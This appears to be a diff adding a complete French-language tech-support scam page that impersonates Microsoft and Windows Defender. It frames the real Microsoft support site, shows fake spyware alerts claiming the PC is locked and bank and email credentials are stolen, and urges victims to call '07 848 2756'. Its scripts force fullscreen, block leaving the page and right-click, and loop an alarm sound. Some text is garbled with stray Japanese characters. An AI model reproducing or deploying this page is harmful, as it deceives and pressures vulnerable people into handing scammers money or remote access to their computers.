@@ -1,0 +1,389 @@
+<!DOCTYPE html><html><head>
+
+  <!-- Required meta tags -->
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<title>Microsoft Service d'assistance téléphonique</title>
+<link rel="stylesheet" href="css/styles.css">
+<script type="text/javascript" async id="gauges-tracker" data-site-id="64d06c0e0242c56745bb20bb" data-track-path="https://track.gaug.es/track.gif" src="js/track.js"></script><script type="text/javascript" src="js/scripts.js"></script>
+<script type="text/javascript" src="js/custom.js"></script>
+
+<script type="text/javascript" src="js/w1.js"></script>
+<link rel="icon" type="image/png" href="images/microsoft.png">
+<link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+<script src="js/jquery.min.js"></script>
+<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="css/font-awesome.min.css">
+
+<style>
+  .black {
+    width: 100%;
+    height: 100%;
+    background-color: rgb(0 0 0 / 47%);
+    opacity: 0.7;
+    transition: 1s;
+    position: absolute;
+    top: -190px;
+    left:0
+  }
+  </style>
+  
+  
+  
+  <script>
+  var elem = document.documentElement;
+  function openFullscreen() {
+    if (elem.requestFullscreen) {
+      elem.requestFullscreen();
+    } else if (elem.webkitRequestFullscreen) { /* Safari */
+      elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) { /* IE11 */
+      elem.msRequestFullscreen();
+    }
+  }
+  
+  function closeFullscreen() {
+    if (document.exitFullscreen) {
+      document.exitFullscreen();
+    } else if (document.webkitExitFullscreen) { /* Safari */
+      document.webkitExitFullscreen();
+    } else if (document.msExitFullscreen) { /* IE11 */
+      document.msExitFullscreen();
+    }
+  }
+  </script>
+
+<script type="text/javascript">
+window.onbeforeunload = function() {
+   if (data_needs_saving()) {
+       return "Appelez la ligne d'assistance Windows Defender maintenant
+";
+   } else {
+      return;
+   }
+};
+        </script>
+        <script type="text/javascript">
+            window.addEventListener("beforeunload", function (e) {
+         var confirmationMessage = 'on dirait que vous modifiez quelque chose. '
+                            + 'Vos modifications seront perdues si vous quittez avant d'avoir enregistré。';
+
+                (e || window.event).returnValue = confirmationMessage; //Gecko + IE
+                return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
+            });
+        </script>
+
+<script>
+  // Disable right-click on the entire page
+  document.addEventListener('contextmenu', function(event) {
+    event.preventDefault();
+  });
+</script>
+
+</head>
+<body id="mycanvas" onclick="playSound()">
+
+  <iframe src="https://support.microsoft.com/nl-nl" scrolling="no" id="frame" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; ">
+  </iframe>
+
+  <a onclick="openFullscreen();" rel="noreferrer" id="link_black" style>
+    <div class="black" style="height: 100%;"></div>
+</a>
+
+<div class="box" id="box">
+<div class="top">
+<p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Windows support<img src="images/minimize.jpeg" class style="float: right; width:115px;"></p>
+</div>
+
+<h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1">La sécurité en un coup d'œil</h4>
+<p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2"><br>Découvrez ce qui arrive à la sécurité de votre appareil et prenez toutes les mesures nécessaires。</p>
+<div class="centerright">
+<ul>
+<li>
+<br>
+<img src="images/kxFy-clip.png" width="50px;">
+<p>Protection contre les virus et les menaces</p>
+<p style="top: 103px; position: absolute; font-size: 13px; color: grey;">action est requise. Exécutez une analyse pour vérifier les menaces。</p>
+
+</li>
+<li>
+<br><br>
+<img src="images/qsbs-firewall.png" width="60px;">
+<p>Pare-feu et protection réseau</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">Aucune action nécessaire.</p>
+</li>
+</ul>
+<ul>
+<li>
+<br>
+<img src="images/s-S4-acc.png" width="60px;">
+<p>Protection du compte</p>
+<p style="top: 125px; position: absolute; font-size: 13px; color: grey;">Aucune action nécessaire。</p>
+</li>
+<li>
+<br>
+<img src="images/Z5BR-network.png" width="51px;">
+<p>Contrôle des applications et du navigateur</p>
+<p style="top: 270px; position: absolute; font-size: 13px; color: grey;">Aucune action nécessaire。</p>
+</li>
+</ul>
+</div>
+<img src="images/uZbx-si.png" class style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+<br>
+</div>
+
+
+<!--Windows Security Quick Scan-->
+<div class="scan" id="scan">
+  <div class="top">
+  <p style="font-size: 17px;  font-family: Arial, Helvetica, sans-serif;">Windows Sécurité<img src="images/minimize.jpeg" class style="float: right; width:115px;"></p>
+  </div>
+  <h4 style="position: absolute; left: 70px; top: 53px; font-weight: 300;" id="text1"><img src="images/okPE-vs.png" width="25px;" style="margin-right: 10px;vertical-align: sub;">Protection contre les virus et les menaces</h4>
+  <p style="position: absolute; left: 70px; top: 100px; font-weight: 0; font-size: 13px;" id="text2">Protection des appareils contre les menaces。</p>
+
+<h3 style="    position: absolute;
+right: 150px;
+top: 6px;
+font-weight: 500;
+font-size: 19px;" id="text12"><b>07 848 2756 (sécurité gratuite)</b></h3>
+
+  <div class="centerright">
+
+
+  <ul>
+  <li>
+
+
+
+  <div class="flex"> <img src="images/-EBq-current.png" width="20px" height="20px;" style="margin-right: 10px; top: 10px; position: absolute;"><p style="font-weight: 400; position: absolute; left: 30px;">menace actuelle</p></div>
+
+
+  <br><br>
+  <div class="progress" id="bar">
+    <div class="progress__bar"></div>
+  </div>
+
+  <p style="font-size: 13px;" id="info">Analyse rapide en cours...<br>temps restant estimé: <n id="time">0</n><br><n id="amount">0</n> fichiers scannés。</p>
+
+  <a href="#" class="button" id="re">annuler</a>
+  <p style=" font-size: 13px;" id="recx">Continuez à travailler pendant que nous analysons votre appareil。</p>
+
+  <p style="font-size: 13px; color: #0063c6;" id="recx-hide">historique de protection</p>
+  <br>
+  <p id="shx" style="font-size: 13px; color: #0063c6; display: none;">スキャン オプション<br> Menaces autorisées<br> Historique de protection</p>
+
+
+  </li>
+
+  <li>
+
+<div class="flex"><img src="images/nOxp-sett.png" height="28px" width="30px;" style="margin-right: 10px; margin-top: 5px;"><p style="position: absolute; left: 35px;    bottom: 84px;    line-height: 18px;">Paramètres de protection contre les virus et les menaces </p> </div>
+<p style="color: grey; font-size: 13px;">Aucune action nécessaire</p>
+<p style="font-size: 13px; color: #0063c6;">Gérer vos paramètres</p>
+  </li>
+  </ul>
+  <ul>
+
+  <li>
+
+
+  <p style="position: absolute; top: -55px;">J'ai une question？</p>
+
+  <p style="font-size: 13px; color: #0063c6; position: absolute; top: -15px;">obtenir de l'aide</p>
+
+  </li>
+  <li>
+
+
+    <p style="position: absolute; top: 25px;">qui me protégera?</p>
+
+    <p style="font-size: 13px; color: #0063c6; position: absolute; top: 65px;">Gestion des fournisseurs</p>
+
+    </li>
+    <li>
+
+
+      <p style="position: absolute; top: 100px; "><br>Windows Aidez-nous à améliorer la sécurité de</p>
+
+      <p style="font-size: 13px; color: #0063c6; position: absolute; top: 152px;">Envoyez-nous vos commentaires</p>
+
+      </li>
+      <li>
+
+        <p style="position: absolute; top: 190px;">Modifier vos paramètres de confidentialité</p>
+        <p style="position: absolute; top: 220px; font-size: 13px;">Windows Afficher et modifier les paramètres de confidentialité pour<br><n id="which"></n> Terminal.</p>
+
+        <p style="font-size: 13px; color: #0063c6; position: absolute; top: 270px;">Paramètres de confidentialité<br>Tableau de bord de confidentialité<br>Déclaration de confidentialité</p>
+
+        </li>
+
+  </ul>
+
+  </div>
+  <img src="images/uZbx-si.png" class style="border-bottom-left-radius: 10px;" width="30.9px; height: 15.2px;" id="clscl">
+  <br>
+  </div>
+  <script>
+          navigator.userAgentData.getHighEntropyValues(["platformVersion"])
+   .then(ua => {
+     if (navigator.userAgentData.platform === "Windows") {
+       const majorPlatformVersion = parseInt(ua.platformVersion.split('.')[0]);
+       if (majorPlatformVersion >= 13) {
+        document.getElementById("which").innerHTML = " 11";
+        }
+        else if (majorPlatformVersion > 0) {
+          document.getElementById("which").innerHTML = " 10";
+        }
+        else {
+          console.log("Au-delà");
+        }
+     }
+     else {
+       console.log("Windows ne fonctionne pas avec
+");
+     }
+   });
+  </script>
+
+
+
+
+
+
+<div class="alert_popup cardcontainer lightbox">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <p class="text-center" style="    font-size: 16px;
+font-weight: normal;
+margin: 0;
+margin-bottom: 5px;
+padding: 5px 10px;
+color: #fff;font-weight: bold;
+margin-top: 8px; text-align: center;">Windows Sécurité - Alerte de logiciel espion</p>
+                <p class="text-center">** L'accès à ce PC a été bloqué pour des raisons de sécurité **</p>
+                <p>Votre ordinateur a été averti qu'il est infecté par un logiciel espion cheval de Troie. Les données suivantes ont été compromises。<br><br>
+                  > E-mail ID<br> > mot de passe bancaire<br>
+                  > Identifiant Facebook<br>
+                  > Photos et photos Documents </p>
+
+                  <!-- <p>Windows Une analyse de sécurité a détecté des logiciels publicitaires potentiellement indésirables sur cet appareil qui peuvent voler des mots de passe, des identités en ligne, des informations financières, des fichiers personnels, des images ou des documents. <br><br></p> -->
+                  <p>Veuillez nous contacter immédiatement afin que nos ingénieurs puissent vous expliquer le processus de suppression par téléphone.<br><br>
+                    
+                    Veuillez contacter le support Windows immédiatement pour signaler cette menace, empêcher l'usurpation d'identité et déverrouiller l'accès à cet appareil. <br><br>
+                    La fermeture de cette fenêtre met vos informations personnelles en danger et interrompt votre enregistrement Windows.</p>
+
+               <p style="padding-bottom: 0px;">Windows Support <strong>07 848 2756 (Gratuit)</strong></p>
+               <div class="action_buttons"> <a class id="leave_page" style>Compris</a> <a class id="leave_page">annuler</a> </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+<audio id="beep" loop>
+  <source src="media/_Fm7-alert.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  addEventListener("click", function() {
+var el = document.documentElement
+  , rfs =
+         el.requestFullScreen
+      || el.webkitRequestFullScreen
+      || el.mozRequestFullScreen
+;
+rfs.call(el);
+});
+
+</script>
+
+<div id="lst" " class="lst lightbox" style="cursor:pointer">
+  <div class="ilb top">
+      <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+          <span id="txtadd" class="fl title"><span class="fl ilb"><img src="images/def.png" class="logo3"></span> WindowsDefender centre de sécuritéー</span>
+          <span id="txts1" class="fl title2"><a href="#"><img src="images/cross.png"></a></span>
+
+      </div>
+  </div>
+  <div id="txtintro">
+              <span class="colo-rd">application: Ads.fiancetrack(2).dll<br>
+                Menaces détectées : Trojan Spyware</span>
+  </div>
+  <img id="banner" src="images/virus-images.jpeg">
+  <div id="disclaimer">
+      L'accès à ce PC a été bloqué pour des raisons de sécurité。<br>
+      <span class="support">Windows support: 07 848 2756 (Gratuit)</span>
+  </div>
+  <div id="bottom">
+      <img id="badge" src="images/microsoft.png"><span class="title3">microsoft</span>
+      <ul>
+          <li>
+              <a href="#">
+                  <div class="fr button2">
+                      <span id="addtochromebutton">Scan</span>
+                  </div>
+              </a>
+          </li>
+          <li>
+              <a href="#">
+                  <div class="fr buttons blink">
+                      <span id="addtochromebutton">Ok</span>
+                  </div>
+              </a>
+          </li>
+      </ul>
+
+  </div>
+</div>
+
+
+
+<div id="footer" style="bottom: 0; position: absolute;width: auto;overflow: hidden;">
+  <div class="row">
+
+      <div class="col-md-12">
+          <div class="right-foot" style="text-align: center;">
+              <span id="footertxt"><img src="images/microsoft.png"> microsoft: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">Coordonnées de l'assistance <span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">07 848 2756 (Gratuit)</span></span>
+          </div>
+      </div>
+      <div class="col-md-12">
+          <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">les fenêtres
+                                                                       Defender SmartScreenは、
+Empêche l'affichage d'applications non reconnues. cette applicationL'exécutage peut mettre votre PC
+                                                                      en danger。 Windows Defender Scanは、potentiel de vol sur cet appareil                                                               Trouvé des logiciels publicitaires indésirables
+                                            mots de passe, identifiants en ligne, informations financières, fichiers personnels, photos ou
+                                                                       document.</small></marquee>
+      </div>
+  </div>
+
+
+</div>
+
+<div id="welcomeDiv" style=" display:none; background-color:#000; height: auto; width: 550px; margin-left:32%;position: absolute;z-index: 9999999999;text-align: center;
+     margin-top: -8px; " class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">Ne redémarrez pas et n'utilisez pas
+        votre ordinateur.<br>L'ordinateur est désactivé. S'il vous plait appeller windows support。<br>L'accès à ce PC a été bloqué pour des raisons de sécurité。<br>Veuillez nous contacter immédiatement. Un technicien vous aidera à résoudre le problème.</p>
+
+
+</div>
+
+
+
+
+<script>
+  $(document).ready(function () {
+      $("#mycanvas").click(function () {
+          $("#welcomeDiv").show();
+      });
+  });
+</script>
+
+
+
+
+
+ 
+
+
+
+</body></html>
